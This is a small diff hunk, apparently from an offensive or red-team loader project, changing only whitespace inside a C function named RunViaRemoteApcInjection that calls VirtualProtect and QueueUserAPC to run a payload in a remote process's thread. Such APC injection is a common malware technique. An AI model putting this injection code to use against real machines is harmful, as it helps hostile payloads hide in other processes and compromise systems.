@@ -300,7 +300,7 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 		_dbg("[!] VirtualProtect Failed With Error : %d", GetLastError());
 		return FALSE;
 	}
-
+	
 	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
 		_dbg("[!] QueueUserAPC Failed With Error : %d ", GetLastError());
 		return FALSE;
